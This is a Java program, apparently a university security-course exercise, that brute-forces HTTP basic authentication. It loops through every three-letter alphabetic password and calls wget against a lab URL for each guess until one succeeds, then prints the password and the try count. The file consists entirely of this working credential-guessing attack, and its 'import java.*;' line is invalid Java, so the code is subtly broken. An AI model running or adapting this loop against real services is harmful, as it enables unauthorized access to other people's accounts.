import java.io.*;
import java.*;
public class BruteForce {
    public static void main ( String v0[] ) {
        String v1;
        v1 = null;
        String v2;
        v2 = "http://sec-crack.cs.rmit.edu./SEC/2/";
        String v3;
        v3 = new String (
            "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ" );
        String v4;
        v4 = null;
        int v5;
        v5 = 0;
        int v6;
        v6 = 0;
        v5 = v3.length();
        int v7;
        v7 = 0;
        while ( v7 < v5 ) {
            int v8;
            v8 = 0;
            while ( v8 < v5 ) {
                int v9;
                v9 = 0;
                while ( v9 < v5 ) {
                    try {
                        v4 = String.valueOf ( v3.charAt ( v7 ) )
                             + String.valueOf ( v3.charAt ( v8 ) )
                             + String.valueOf ( v3.charAt ( v9 ) );
                        System.out.print ( v3.charAt ( v7 ) );
                        System.out.print ( v3.charAt ( v8 ) );
                        System.out.println ( v3.charAt ( v9 ) );
                        Process v10;
                        v10 = Runtime.getRuntime().exec (
                                  "wget --http-user= --http-passwd=" + v4 + " "
                                  + v2 );
                        BufferedReader v11;
                        v11 = new BufferedReader ( new InputStreamReader (
                                                       v10.getInputStream() ) );
                        BufferedReader v12;
                        v12 = new BufferedReader ( new InputStreamReader (
                                                       v10.getErrorStream() ) );
                        for ( ; ( v1 = v11.readLine() ) != null; ) {
                            System.out.println ( v1 );
                        }
                        for ( ; ( v1 = v12.readLine() ) != null; ) {
                            System.out.println ( v1 );
                        }
                        try {
                            v10.waitFor();
                        } catch ( InterruptedException v13 ) {
                        }
                        v6 = v6 + 1;
                        if ( ( v10.exitValue() ) == 0 ) {
                            System.out.println ( "**********PASSWORD IS: " + v4 );
                            System.out.println ( "**********NUMBER OF TRIES: "
                                                 + v6 );
                            System.exit ( 1 );
                        }
                    } catch ( IOException v14 ) {
                        System.out
                        .println ( "exception happened - here's what I know: " );
                        v14.printStackTrace();
                        System.exit ( -1 );
                    }
                    v9 = v9 + 1;
                }
                v8 = v8 + 1;
            }
            v7 = v7 + 1;
        }
    }
}
